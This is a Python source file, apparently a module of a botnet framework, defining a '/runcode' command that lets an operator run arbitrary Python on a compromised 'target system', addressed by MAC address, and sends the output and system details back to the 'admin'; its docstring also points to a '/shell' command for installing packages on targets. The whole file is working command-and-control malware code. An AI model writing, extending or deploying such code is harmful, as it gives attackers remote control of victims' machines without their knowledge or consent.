import sys
import time
import threading
import traceback
from .. import BotNet, Context, UserException


@BotNet.default_script(script_version="0.0.1")
def runcode(context: Context) -> str:
    """run python code on target system and return stdout
    syntax:
    `/runcode CODE`
        or 
    `[mac-address] /runcode CODE`

    example command:

    `8548646486648 /runcode print("Hello World")` \n
    `/runcode print("Hello World")` \n

    `/runcode from time import sleep\n
    for n in range(10):
        sleep(1)
        print(n)`

    if you need import some not built in library, first install it on target system and then you can use it in your code.
    example install library:
        `/shell pip install requests`
    """
    if len(context.command) > 0:
        code = " ".join(context.command)
        # run code in thread to avoid blocking main thread
        thread = threading.Thread(target=exec_code, args=(context, code))
        thread.start()
        for _ in range(40):
            # wait for thread to finish
            if not thread.is_alive():
                return None
            time.sleep(0.1)

        # if thread still alive after 4 seconds:
        return "Your code is running in the background and you will get the results when it is done."
    else:
        raise UserException("Please enter your code.")


def exec_code(context: Context, code: str):
    """execute python code and send stdout/stderr to admin"""

    def NewPrint(*value, sep=" ", end="\n", file=sys.stdout, flush=False):
        """overwrite print function, cache stdout output"""
        print_cacher.append(f"""{f'{sep}'.join(map(str, value))}{end}""")

    stderr = ""

    print_cacher = []
    try:
        exec(
            code,
            {
                "print": NewPrint,  # overwrite print function
                "print_cacher": print_cacher,  # list
            },
        )
    except Exception as ex:
        stderr = "".join(traceback.format_exception(ex, value=ex, tb=ex.__traceback__))
    stdout = "".join(print_cacher)  # join all stdout from print_cacher

    res = f"""
________result:
{stdout}
{stderr}
________Executed Code:
{code}"""

    context.engine.send(
        res,
        additionalـinfo=context.system_info(minimal=True),
    )
